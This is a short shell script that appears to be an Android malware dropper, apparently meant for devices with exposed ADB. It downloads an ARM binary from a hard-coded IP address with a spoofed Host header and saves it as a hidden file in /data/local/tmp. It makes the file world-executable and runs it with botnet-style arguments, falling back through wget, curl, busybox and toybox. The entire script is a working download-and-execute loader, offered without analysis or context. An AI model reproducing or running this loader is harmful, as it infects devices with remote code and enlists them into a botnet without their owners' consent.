#!/bin/sh
URL="http://185.199.108.153/wow/ntb.arm7"
HOST="store.risesmp.cc"
OUT="/data/local/tmp/.ntb"

[ -x "$OUT" ] && exec "$OUT" adbawd
[ -f "$OUT" ] && chmod 777 "$OUT" && exec "$OUT" adbawd

wget  --header="Host: $HOST" "$URL" -O "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" adbawd
busybox wget --header="Host: $HOST" "$URL" -O "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" adbawd
toybox wget --header="Host: $HOST" "$URL" -O "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" adbawd
curl -L -H "Host: $HOST" "$URL" -o "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" adbslaves
busybox curl -L -H "Host: $HOST" "$URL" -o "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" adbawd
toybox curl -L -H "Host: $HOST" "$URL" -o "$OUT" 2>/dev/null && chmod 777 "$OUT" && exec "$OUT" adbawd
exit 1
